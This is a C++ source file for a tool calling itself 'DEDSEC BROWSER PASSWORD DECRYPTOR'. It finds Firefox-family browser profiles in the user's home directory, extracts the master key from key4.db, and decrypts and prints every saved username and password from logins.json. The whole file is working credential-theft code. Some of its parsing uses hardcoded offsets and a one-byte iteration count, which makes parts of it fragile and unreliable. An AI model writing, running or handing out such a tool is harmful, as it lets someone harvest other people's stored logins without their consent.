
#include <map>
#include <cstdint>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <iostream>
#include <iomanip>
#include <filesystem>
#include <stdexcept>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/des.h>

namespace fs = std::filesystem;

struct sqlite3;
struct sqlite3_stmt;
extern "C" {
    int sqlite3_open(const char*, sqlite3**);
    int sqlite3_close(sqlite3*);
    int sqlite3_prepare_v2(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
    int sqlite3_step(sqlite3_stmt*);
    int sqlite3_finalize(sqlite3_stmt*);
    int sqlite3_column_type(sqlite3_stmt*, int);
    const void* sqlite3_column_blob(sqlite3_stmt*, int);
    int sqlite3_column_bytes(sqlite3_stmt*, int);
    #define SQLITE_OK    0
    #define SQLITE_ROW   100
    #define SQLITE_BLOB  4
}

using u8 = uint8_t;
using bytevec = std::vector<u8>;

std::string hex(const u8* d, size_t n) {
    std::ostringstream os;
    os << std::hex << std::setfill('0');
    for (size_t i = 0; i < n; ++i) os << std::setw(2) << (unsigned)d[i];
    return os.str();
}
std::string hex(const bytevec& v) { return hex(v.data(), v.size()); }

bytevec to_bytes(const std::string& s) { return bytevec(s.begin(), s.end()); }
std::string to_string(const bytevec& v) { return std::string(v.begin(), v.end()); }

bytevec base64_decode(const std::string& s) {
    static const int8_t T[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
    };
    bytevec out;
    out.reserve(s.size() * 3 / 4);
    int val = 0, bits = 0;
    for (char c : s) {
        if (c == '=') break;
        int v = (u8)c < 256 ? T[(u8)c] : -1;
        if (v < 0) continue;
        val = (val << 6) | v;
        bits += 6;
        if (bits >= 8) { bits -= 8; out.push_back((val >> bits) & 0xFF); }
    }
    return out;
}

bytevec sha1(const bytevec& data) {
    bytevec out(SHA_DIGEST_LENGTH);
    SHA1(data.data(), data.size(), out.data());
    return out;
}

bytevec sha256(const bytevec& data) {
    bytevec out(SHA256_DIGEST_LENGTH);
    SHA256(data.data(), data.size(), out.data());
    return out;
}

bytevec hmac_sha256(const bytevec& key, const bytevec& msg) {
    bytevec out(SHA256_DIGEST_LENGTH);
    unsigned int len = SHA256_DIGEST_LENGTH;
    HMAC(EVP_sha256(), key.data(), key.size(), msg.data(), msg.size(), out.data(), &len);
    out.resize(len);
    return out;
}

bytevec pbkdf2_sha256(const bytevec& pw, const bytevec& salt, int iterations, size_t dklen) {
    bytevec out(dklen);
    PKCS5_PBKDF2_HMAC((const char*)pw.data(), pw.size(),
                       salt.data(), salt.size(), iterations,
                       EVP_sha256(), dklen, out.data());
    return out;
}

bytevec aes_cbc_decrypt(const bytevec& key, const bytevec& iv, const bytevec& ct) {
    bytevec pt(ct.size() + 16);
    int outlen = 0, finallen = 0;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data());
    EVP_DecryptUpdate(ctx, pt.data(), &outlen, ct.data(), ct.size());
    EVP_DecryptFinal_ex(ctx, pt.data() + outlen, &finallen);
    EVP_CIPHER_CTX_free(ctx);
    pt.resize(outlen + finallen);
    return pt;
}

bytevec des3_cbc_decrypt(const bytevec& key, const bytevec& iv, const bytevec& ct) {
    bytevec pt(ct.size() + 8);
    int outlen = 0, finallen = 0;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_des_ede3_cbc(), nullptr, key.data(), iv.data());
    EVP_DecryptUpdate(ctx, pt.data(), &outlen, ct.data(), ct.size());
    EVP_DecryptFinal_ex(ctx, pt.data() + outlen, &finallen);
    EVP_CIPHER_CTX_free(ctx);
    pt.resize(outlen + finallen);
    return pt;
}

void strip_pkcs7(bytevec& pt, size_t block_size) {
    if (pt.empty()) return;
    u8 pad = pt.back();
    if (pad > 0 && pad <= block_size && pt.size() >= pad) {
        bool ok = true;
        for (size_t i = pt.size() - pad; i < pt.size(); ++i)
            if (pt[i] != pad) { ok = false; break; }
        if (ok) pt.resize(pt.size() - pad);
    }
}

struct ASN1Node {
    size_t offset;  
    size_t hdr_len; 
    size_t len;    
    bool constructed;
    std::vector<ASN1Node> children;
    const u8* value_ptr(const u8* base) const { return base + offset + hdr_len; }
};

ASN1Node asn1_parse(const u8* data, size_t maxlen, size_t& pos) {
    ASN1Node n;
    n.offset = pos;
    n.hdr_len = 1; 
    u8 b = data[pos++];
    n.constructed = b & 0x20;
    size_t len = data[pos++];
    n.hdr_len++;
    if (len & 0x80) {
        int cnt = len & 0x7F;
        len = 0;
        while (cnt--) { len = (len << 8) | data[pos++]; n.hdr_len++; }
    }
    n.len = len;
    size_t end = pos + len;
    if (n.constructed)
        while (pos < end) n.children.push_back(asn1_parse(data, maxlen, pos));
    else
        pos = end;
    return n;
}

struct PBES2Params {
    bytevec salt;
    int iterations = 1;
    int keylen = 32;
    bytevec iv;
    bytevec ct;
};

PBES2Params parse_pbes2(const bytevec& data) {
    PBES2Params p;
    p.salt.assign(data.begin() + 35, data.begin() + 67);
    p.iterations = data[69];
    p.keylen = data[72];
    u8 iv_tag = data[98];
    u8 iv_len = data[99];
    p.iv.push_back(iv_tag);
    p.iv.push_back(iv_len);
    p.iv.insert(p.iv.end(), data.begin() + 100, data.begin() + 100 + iv_len);
    u8 ct_len = data[115];
    p.ct.assign(data.begin() + 116, data.begin() + 116 + ct_len);
    return p;
}

bytevec decrypt_pbes2(const bytevec& data, const bytevec& password) {
    auto p = parse_pbes2(data);
    auto dk = pbkdf2_sha256(password, p.salt, p.iterations, p.keylen);
    return aes_cbc_decrypt(dk, p.iv, p.ct);
}

const bytevec AES_OID  = {0x60,0x86,0x48,0x01,0x65,0x03,0x04,0x01,0x2a}; 
const bytevec DES3_OID = {0x2a,0x86,0x48,0x86,0xf7,0x0d,0x03,0x07};

std::string decrypt_login_entry(const std::string& b64, const bytevec& key) {
    auto data = base64_decode(b64);
    if (data.size() < 10) throw std::runtime_error("Data too short");

    size_t pos = 0;
    auto root = asn1_parse(data.data(), data.size(), pos);
    if (root.children.size() < 3) throw std::runtime_error("Bad ASN.1: need 3 children");

    auto& alg_id = root.children[1];
    if (alg_id.children.size() < 2) throw std::runtime_error("Bad AlgorithmIdentifier");

    auto& oid_node = alg_id.children[0];
    bytevec oid(oid_node.value_ptr(data.data()), oid_node.value_ptr(data.data()) + oid_node.len);

    auto& iv_node = alg_id.children[1];
    bytevec iv(iv_node.value_ptr(data.data()), iv_node.value_ptr(data.data()) + iv_node.len);

    auto& ct_node = root.children[2];
    bytevec ct(ct_node.value_ptr(data.data()), ct_node.value_ptr(data.data()) + ct_node.len);

    bytevec pt;
    if (oid == AES_OID) {
        bytevec aes_key(key.begin(), key.begin() + std::min(key.size(), size_t(32)));
        aes_key.resize(32, 0);
        pt = aes_cbc_decrypt(aes_key, iv, ct);
        strip_pkcs7(pt, 16);
    } else if (oid == DES3_OID) {
        bytevec dk(key.begin(), key.begin() + std::min(key.size(), size_t(24)));
        dk.resize(24, 0);
        pt = des3_cbc_decrypt(dk, iv, ct);
        strip_pkcs7(pt, 8);
    } else {
        throw std::runtime_error("Unknown cipher OID: " + hex(oid));
    }

    return to_string(pt);
}

struct SQLiteDB {
    sqlite3* db = nullptr;
    ~SQLiteDB() { if (db) sqlite3_close(db); }
    bool open(const std::string& path) { return sqlite3_open(path.c_str(), &db) == SQLITE_OK; }

    bytevec query_blob(const std::string& sql, int col = 0) {
        sqlite3_stmt* stmt = nullptr;
        bytevec res;
        if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) == SQLITE_OK) {
            if (sqlite3_step(stmt) == SQLITE_ROW) {
                int n = sqlite3_column_bytes(stmt, col);
                const u8* p = (const u8*)sqlite3_column_blob(stmt, col);
                if (p && n > 0) res.assign(p, p + n);
            }
            sqlite3_finalize(stmt);
        }
        return res;
    }

    std::vector<bytevec> query_blobs(const std::string& sql) {
        std::vector<bytevec> rows;
        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                int n = sqlite3_column_bytes(stmt, 0);
                const u8* p = (const u8*)sqlite3_column_blob(stmt, 0);
                bytevec v;
                if (p && n > 0) v.assign(p, p + n);
                rows.push_back(std::move(v));
            }
            sqlite3_finalize(stmt);
        }
        return rows;
    }
};

bytevec extract_key(const std::string& key4db_path) {
    SQLiteDB db;
    if (!db.open(key4db_path)) throw std::runtime_error("Cannot open " + key4db_path);

    auto item1 = db.query_blob("SELECT item1 FROM metaData WHERE id = 'password'");
    if (item1.empty()) throw std::runtime_error("No 'password' entry in metaData");

    auto pw = sha1(item1);

    auto a11_rows = db.query_blobs("SELECT a11 FROM nssPrivate");

    bytevec best_key;
    for (auto& a11 : a11_rows) {
        if (a11.empty()) continue;
        try {
            auto pt = decrypt_pbes2(a11, pw);
            strip_pkcs7(pt, 16);
            if (pt.size() > best_key.size()) best_key = pt;
        } catch (...) {}
    }
    if (best_key.empty()) throw std::runtime_error("Could not decrypt any key");
    return best_key;
}

std::string json_get_str(const std::string& json, const std::string& key, size_t start = 0) {
    std::string pat = "\"" + key + "\"";
    size_t p = json.find(pat, start);
    if (p == std::string::npos) return "";
    p += pat.size();
    while (p < json.size() && (json[p] == ' ' || json[p] == ':' || json[p] == '\t' || json[p] == '\n')) ++p;
    if (p >= json.size()) return "";
    if (json[p] == '"') {
        ++p;
        std::string val;
        while (p < json.size() && json[p] != '"') {
            if (json[p] == '\\' && p + 1 < json.size()) { val += json[p + 1]; p += 2; }
            else val += json[p++];
        }
        return val;
    }
    if (json[p] == 'n' && json.substr(p, 4) == "null") return "";
    // Number
    size_t e = p;
    while (e < json.size() && (json[e] == '-' || (json[e] >= '0' && json[e] <= '9'))) ++e;
    return json.substr(p, e - p);
}

std::vector<std::string> BROWSER_ROOTS = {
    "~/.mozilla/firefox",
    "~/.zen",
    "~/.librewolf",
    "~/.waterfox",
    "~/.floorp",
    "~/.pulse",
};

std::vector<std::pair<std::string,std::string>> find_profile_pairs(const std::string& root) {
    std::vector<std::pair<std::string,std::string>> pairs;
    std::error_code ec;
    if (!fs::is_directory(root, ec)) return pairs;
    for (auto& entry : fs::recursive_directory_iterator(root, ec)) {
        if (!entry.is_directory()) continue;
        auto kp = entry.path() / "key4.db";
        auto lp = entry.path() / "logins.json";
        if (fs::is_regular_file(kp, ec) && fs::is_regular_file(lp, ec))
            pairs.emplace_back(kp.string(), lp.string());
    }
    return pairs;
}

int main(int argc, char** argv) {
    std::cout << "\033[2J\033[H" << std::flush;

    std::cout << R"(

    ╔════╗╔═══╗╔═╗ ╔╗
    ╚══╗ ║║╔══╝║║╚╗║║
      ╔╝╔╝║╚══╗║╔╗╚╝║
     ╔╝╔╝ ║╔══╝║║╚╗║║
    ╔╝ ╚═╗║╚══╗║║ ║║║
    ╚════╝╚═══╝╚╝ ╚═╝
                         
    DEDSEC BROWSER PASSWORD DECRYPTOR
        
    Coded by: 0xbit
    )" << "\n";

    std::vector<std::pair<std::string,std::string>> targets;

    if (argc >= 3) {
        targets.emplace_back(argv[1], argv[2]);
    } else {
        const char* home = getenv("HOME");
        if (!home) { std::cerr << "HOME not set\n"; return 1; }
        std::string homedir(home);

        for (auto& root : BROWSER_ROOTS) {
            if (root[0] == '~') root = homedir + root.substr(1);
            for (auto& p : find_profile_pairs(root)) {
                bool dup = false;
                for (auto& t : targets) if (t.first == p.first) { dup = true; break; }
                if (!dup) targets.push_back(p);
            }
        }
        if (targets.empty()) {
            std::cerr << "No browser profiles with saved passwords found.\n\nSearched:\n";
            for (auto& r : BROWSER_ROOTS) std::cerr << "  " << r << "\n";
            std::cerr << "\nManual: " << argv[0] << " key4.db logins.json\n";
            return 1;
        }
        std::cout << "[+] Found " << targets.size() << " profile(s)\n";
    }

    int total = 0;
    for (auto& [k4, lj] : targets) {
        std::cout << "\n" << std::string(80, '-') << "\n";
        std::cout << "  key4.db    : " << k4 << "\n";
        std::cout << "  logins.json: " << lj << "\n";
        std::cout << std::string(80, '-') << "\n";

        try {
            auto key = extract_key(k4);
            std::cout << "[+] Key extracted (" << key.size() << " bytes)\n";

            std::ifstream jf(lj);
            if (!jf) { std::cerr << "Cannot open " << lj << "\n"; continue; }
            std::string json((std::istreambuf_iterator<char>(jf)), std::istreambuf_iterator<char>());

            size_t pos = 0;
            int n = 0;
            while (true) {
                auto host = json_get_str(json, "hostname", pos);
                if (host.empty()) break;
                auto euser = json_get_str(json, "encryptedUsername", pos);
                auto epass = json_get_str(json, "encryptedPassword", pos);
                auto id    = json_get_str(json, "\"id\"", pos);
                if (id.empty()) id = json_get_str(json, "id", pos);

                std::string user, pass;
                try { user = decrypt_login_entry(euser, key); } catch (...) { user = "[ERROR]"; }
                try { pass = decrypt_login_entry(epass, key); } catch (...) { pass = "[ERROR]"; }

                std::cout << "  [" << id << "] " << host << "\n";
                std::cout << "       Username : " << user << "\n";
                std::cout << "       Password : " << pass << "\n\n";
                ++n;

                pos = json.find("\"encryptedUsername\"", pos);
                if (pos == std::string::npos) break;
                auto skip = json.find("\"encryptedUnknownFields\"", pos);
                if (skip == std::string::npos || skip - pos > 2000)
                    skip = json.find("\"guid\"", pos);
                if (skip == std::string::npos || skip - pos > 2000) break;
                pos = skip + 10;
            }
            total += n;
        } catch (const std::exception& e) {
            std::cerr << "[!] Error: " << e.what() << "\n";
        }
    }
    std::cout << "[+] Total: " << total << " password(s) decrypted.\n";
    return 0;
}
